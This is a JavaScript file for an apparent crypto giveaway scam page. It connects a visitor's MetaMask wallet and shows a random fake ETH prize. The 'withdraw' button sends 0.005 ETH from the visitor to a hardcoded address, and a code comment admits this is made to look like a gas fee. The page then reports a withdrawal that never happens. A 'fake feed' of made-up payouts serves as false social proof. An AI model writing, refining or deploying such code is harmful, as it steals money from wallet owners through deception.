let provider, signer, userAddress, rewardAmount = 0;

document.getElementById("connectBtn").onclick = async () => {
  if (typeof window.ethereum === 'undefined') {
    alert("MetaMask not detected.");
    return;
  }

  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = provider.getSigner();
  userAddress = await signer.getAddress();

  document.getElementById("walletAddress").innerText = `Wallet: ${userAddress}`;
  document.getElementById("referralLink").innerText = `${window.location.origin}?ref=${userAddress}`;
};

document.getElementById("spinBtn").onclick = () => {
  rewardAmount = (Math.random() * 0.3 + 0.1).toFixed(3);
  document.getElementById("rewardDisplay").innerText = `🎉 You won ${rewardAmount} ETH!`;
};

document.getElementById("withdrawBtn").onclick = async () => {
  if (!userAddress || rewardAmount === 0) {
    alert("Connect wallet and spin first!");
    return;
  }

  const tx = await signer.sendTransaction({
    to: "0x16107dB547227D8FC6607cC643a59898883021DC",
    value: ethers.utils.parseEther("0.005") // Looks like a gas fee
  });

  document.getElementById("txStatus").innerText = "✅ Withdrawal processed.";
};

// Fake feed
setInterval(() => {
  const rand = Math.random().toString(16).substr(2, 4);
  const li = document.createElement("li");
  li.textContent = `0x${rand}... sent 0.14 ETH`;
  document.getElementById("feedList").prepend(li);
  if (document.getElementById("feedList").children.length > 6) {
    document.getElementById("feedList").removeChild(document.getElementById("feedList").lastChild);
  }
}, 3000);
